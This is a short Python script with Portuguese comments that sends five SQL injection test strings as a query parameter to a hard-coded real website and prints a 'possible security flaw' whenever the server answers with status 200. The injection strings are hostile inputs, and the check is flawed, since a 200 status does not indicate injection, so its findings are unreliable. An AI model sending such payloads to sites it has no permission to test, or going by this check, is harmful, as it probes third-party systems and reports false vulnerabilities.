import requests

# Lista de strings de teste comuns usadas em ataques de injeção de SQL
sql_injection_test_strings = [
  "' OR 1=1 --",
  "' OR '1'='1' --",
  '" OR "1"="1" --',
  "') OR ('1'='1' --",
  "'; SELECT * FROM users --"
]

# URL do site a ser testado
url = "http://www.google.com"

# Loop através da lista de strings de teste
for test_string in sql_injection_test_strings:
  # Envia uma requisição GET para o site com a string de teste incluída como parâmetro
  response = requests.get(url, params={"s": test_string})

  # Verifica se a resposta do site foi afetada pela string de teste
  if response.status_code == 200:
    print(f"Possível falha de segurança encontrada com a string de teste: {test_string}")
  else:
    print(f"Nenhuma falha de segurança encontrada com a string de teste: {test_string}")